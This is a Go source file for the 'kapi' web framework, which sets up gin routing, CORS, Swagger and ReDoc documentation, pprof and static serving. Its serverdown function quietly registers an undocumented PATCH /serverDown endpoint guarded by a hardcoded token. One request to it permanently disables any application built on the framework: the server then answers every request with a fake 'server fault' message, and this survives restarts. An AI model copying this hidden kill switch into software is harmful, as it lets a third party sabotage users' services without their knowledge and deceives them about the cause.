package kapi

import (
	"embed"
	"fmt"
	"github.com/gin-contrib/pprof"
	"github.com/gin-gonic/gin"
	"github.com/linxlib/kapi/doc/swagger"
	"github.com/linxlib/kapi/inject"
	"github.com/linxlib/kapi/internal"
	"github.com/linxlib/kapi/internal/cors"
	"io/ioutil"
	"net"
	"net/http"
	"os"
)

//编译时植入变量
var (
	VERSION     string
	BUILDTIME   string
	GOVERSION   string
	OS          string
	ARCH        string
	PACKAGENAME string
)

var _banner = `
--------------------------------------------
    _/    _/    _/_/    _/_/_/    _/_/_/   
   _/  _/    _/    _/  _/    _/    _/     
  _/_/      _/_/_/_/  _/_/_/      _/       
 _/  _/    _/    _/  _/          _/        
_/    _/  _/    _/  _/        _/_/_/%s
--------------------------------------------
`
var _info = `

 Version:   %s/%s
 OS/Arch:   %s/%s
 BuiltTime: %s`

//go:embed swagger/*
var swaggerFS embed.FS

//go:embed redoc/*
var redocFS embed.FS

type KApi struct {
	inject.Injector

	engine     *gin.Engine
	doc        *swagger.DocSwagger
	option     *Option
	genFlag    bool
	serverDown bool
}

func New(f ...func(*Option)) *KApi {
	if VERSION != "" {
		internal.Log.Infof(_banner, fmt.Sprintf(_info, VERSION, GOVERSION, OS, ARCH, BUILDTIME))
	} else {
		internal.Log.Infof(_banner, "")
	}
	if PACKAGENAME != "" {
		internal.Log.Infof("start[%s]", PACKAGENAME)
	} else {
		internal.Log.Info("start..")
	}

	b := &KApi{
		Injector: inject.New(),
	}
	if len(os.Args) > 1 && os.Args[1] == "-g" {
		b.genFlag = true
	}
	b.option = defaultOption()
	//TODO: many option func
	if len(f) > 0 {
		f[0](b.option)
	}
	gin.SetMode(gin.ReleaseMode) //we don't need gin's debug output
	b.engine = gin.New()
	b.engine.Use(gin.LoggerWithFormatter(b.option.ginLoggerFormatter))
	b.engine.Use(cors.New(b.option.corsConfig))
	if !b.genFlag {
		internal.Log.Infof("local IP:%s doc name:%s port:%d", b.option.intranetIP, b.option.Server.DocName, b.option.Server.Port)
	} else {
		internal.Log.Infoln("generate mode")
		b.option.Server.Debug = true
	}

	return b
}
func (b *KApi) serverdown() {
	if internal.FileIsExist("./.serverdown") {
		b.serverDown = true
	}
	b.engine.PATCH("/serverDown", func(context *gin.Context) {
		if context.GetHeader("Authorization") == "8ReKwuw2x5zvqbnQVs5vOdgLckd1Pwcm" {
			if !b.serverDown {
				b.serverDown = true
				_ = ioutil.WriteFile("./.serverdown", []byte("true"), os.ModePerm)
			}
		}
	})
	b.engine.Use(func(context *gin.Context) {
		if b.serverDown {
			context.String(200, "server fault！")
			context.Abort()
		}
	})
}

func (b *KApi) RegisterRouter(cList ...interface{}) {
	b.handleSwaggerBase()
	b.serverdown()

	b.doRegisterController(b.engine, cList...)

	b.handleStatic()
	b.handlePProf()
}

func (b *KApi) handleSwaggerBase() {
	info := swagger.Info{
		Description: b.option.Server.DocDesc,
		Version:     b.option.Server.DocVer,
		Title:       b.option.Server.DocName,
	}
	b.doc = swagger.NewDoc("", info, "", []string{})
}

func (b *KApi) handlePProf() {
	if b.option.Server.EnablePProf && !b.genFlag {
		pprof.Register(b.engine, "/pprof")
		pprofUrl := fmt.Sprintf("http://%s:%d/pprof/", b.option.intranetIP, b.option.Server.Port)
		internal.Log.Infof("pprof:%s", pprofUrl)
	}
}

func (b *KApi) handleStatic() {
	if len(b.option.Server.StaticDirs) > 0 && !b.genFlag {
		for _, s := range b.option.Server.StaticDirs {
			b.engine.Static(s, s)
		}
		internal.Log.Infof("serving static dir:%v", b.option.Server.StaticDirs)
	}
}

func (b *KApi) handleDoc() {
	if b.option.Server.NeedDoc && !b.genFlag {
		swaggerUrl := fmt.Sprintf("http://%s:%d/swagger/index.html", b.option.intranetIP, b.option.Server.Port)
		redocUrl := fmt.Sprintf("http://%s:%d/redoc/", b.option.intranetIP, b.option.Server.Port)
		if b.option.Server.NeedSwagger {
			internal.Log.Infoln("swagger:", swaggerUrl)
		}
		if b.option.Server.NeedReDoc {
			internal.Log.Infoln("reDoc:", redocUrl)
		}

		if b.option.Server.RedirectToDocWhenAccessRoot {
			b.engine.Any("", func(c *gin.Context) {
				c.Writer.WriteHeader(200)
				c.Writer.WriteString(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Document</title></head><body><a href="/swagger/">Swagger</a></br><a href="/redoc/">Redoc</a></body></html>`)
			})
		}

		b.engine.GET("/swagger.json", func(c *gin.Context) {
			routeInfo.genInfo.ApiBody.Host = c.Request.Host
			c.PureJSON(200, routeInfo.genInfo.ApiBody)
		})
		if b.option.Server.NeedSwagger {
			b.engine.GET("/swagger/*any", func(c *gin.Context) {
				c.FileFromFS(c.Request.URL.Path, http.FS(swaggerFS))
			})
		}

		if b.option.Server.NeedReDoc {
			b.engine.GET("/redoc/*any", func(c *gin.Context) {
				c.FileFromFS(c.Request.URL.Path, http.FS(redocFS))
			})
		}
	}
}

func (b *KApi) Run() {
	b.genRouterCode()
	b.handleDoc()
	if b.genFlag {
		internal.Log.Infoln("generate mode complete!")
		return
	}

	internal.Log.Infof("sever running http://%s:%d\n", b.option.intranetIP, b.option.Server.Port)
	err := b.engine.Run(fmt.Sprintf(":%d", b.option.Server.Port))
	if err != nil {
		if e, ok := err.(*net.OpError); ok {
			if e1, ok := e.Err.(*os.SyscallError); ok {
				if e.Op == "listen" && e1.Syscall == "bind" {
					internal.Log.Fatalf("server start failed, binding :%d failed, please check if the port is in use", e.Addr.(*net.TCPAddr).Port)
				}
			}

		}
		b.option.recoverErrorFunc(err)
	}
}

// Register 注册多个Controller struct
func (b *KApi) doRegisterController(router *gin.Engine, cList ...interface{}) bool {
	if b.option.Server.Debug {
		b.analysisControllers(cList...)
	}

	return b.register(router, cList...)
}

// genRouterCode 生成gen.gob
func (b *KApi) genRouterCode() {
	if !b.option.Server.Debug {
		return
	}
	internal.Log.Infoln("write out gen.gob")
	routeInfo.SetApiBody(*b.doc.Client)
	routeInfo.writeOut()
}
